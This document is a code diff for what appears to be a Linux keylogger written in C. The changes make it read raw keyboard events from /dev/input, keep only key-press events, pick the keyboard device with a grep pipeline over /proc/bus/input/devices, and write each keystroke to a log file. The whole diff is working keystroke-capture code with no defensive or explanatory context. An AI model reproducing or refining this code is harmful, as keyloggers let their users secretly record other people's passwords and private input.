@@ -30,7 +30,7 @@ void config() {
 void startListen() {
 	int fd;
 
-	struct input_event event[64];
+	struct input_event event;
 	size_t size_ie = sizeof(struct input_event);
 
 	char event_path[100] = {'\0'};
@@ -47,21 +47,22 @@ void startListen() {
 	}
 
 	while(1) {
-		if ((read(fd, event, size_ie * 64)) < size_ie) {
+		if ((read(fd, &event, size_ie)) < size_ie) {
         	perror("Error: Failed to read input event from input device.");
 			exit(1);
-    	}
+        }
 
-		fprintf(log_file, "%s", getChar(event->value));
-    	fflush(log_file);
-    	fflush(stdout);
+        if ((event.type == 1) && (event.value == 1)) {
+          fprintf(log_file, "%s", getChar(event.code));
+          fflush(log_file);
+        }
     }
 }
 
 char *getKBDEvent() {
 	char res[64] = "/dev/input/";
 	char ev[64];
-	char *command = "grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -Eo 'event[0-9]+'";
+	char *command = "grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -Eo 'event[0-9]+' | tail -1";
 
 	FILE *output = popen(command, "r");
 	if (output == NULL) {
